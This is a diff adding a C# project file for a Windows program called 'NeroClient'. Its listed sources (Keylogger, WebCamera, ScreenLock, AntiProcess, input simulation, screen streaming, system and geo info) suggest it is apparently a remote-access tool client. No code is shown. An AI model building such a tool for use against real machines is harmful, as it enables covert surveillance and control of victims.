@@ -1,0 +1,151 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{DA897CA4-39BB-4B64-B4DD-E872274282F1}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>NeroClient</RootNamespace>
+    <AssemblyName>NeroClient</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\NeroNet\bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject />
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Speech" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ClientSettings.cs" />
+    <Compile Include="Forms\Chat.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\Chat.Designer.cs">
+      <DependentUpon>Chat.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\InitialForm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\InitialForm.Designer.cs">
+      <DependentUpon>InitialForm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\IScreenLocker.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\ScreenLock.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\ScreenLock.Designer.cs">
+      <DependentUpon>ScreenLock.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Helpers\Enums.cs" />
+    <Compile Include="Helpers\Information\ComputerInfo.cs" />
+    <Compile Include="Helpers\Information\GeoInfo.cs" />
+    <Compile Include="Helpers\Networking\Networking.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Client.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Common.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\EventType.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Logger.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Message.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\NetworkStreamExtensions.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\SafeQueue.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Server.cs" />
+    <Compile Include="Helpers\Networking\Telepathy\Utils.cs" />
+    <Compile Include="Helpers\Services\AntiProcess.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\IInputDeviceStateAdaptor.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\IInputMessageDispatcher.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\IInputSimulator.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\IKeyboardSimulator.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\IMouseSimulator.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\InputBuilder.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\InputSimulator.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\KeyboardSimulator.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\MouseButton.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\MouseSimulator.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\HARDWAREINPUT.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\INPUT.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\InputType.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\KEYBDINPUT.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\KeyboardFlag.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\MouseFlag.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\MOUSEINPUT.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\MOUSEKEYBDHARDWAREINPUT.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\NativeMethods.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\VirtualKeyCode.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\Native\XButton.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\WindowsInputDeviceStateAdaptor.cs" />
+    <Compile Include="Helpers\Services\InputSimulator\WindowsInputMessageDispatcher.cs" />
+    <Compile Include="Helpers\Services\Keylogger.cs" />
+    <Compile Include="Helpers\Services\StreamClasses.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\Enums.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\IUnsafeCodec.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\IVideoCodec.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\CRC32.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\ExtensionAttribute.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\Extensions.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\FastBitmap.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\JpgCompression.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\LzwCompression.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\MurmurHash2Unsafe.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\NativeMethods.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\PayloadWriter.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\PointerHelper.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\SafeQuickLZ.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\src\SimpleBitmap.cs" />
+    <Compile Include="Helpers\Services\StreamLibrary\UnsafeCodecs\UnsafeStreamCodec.cs" />
+    <Compile Include="Helpers\Services\WebCamera\WebCamera.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Forms\Chat.resx">
+      <DependentUpon>Chat.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\InitialForm.resx">
+      <DependentUpon>InitialForm.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\ScreenLock.resx">
+      <DependentUpon>ScreenLock.cs</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
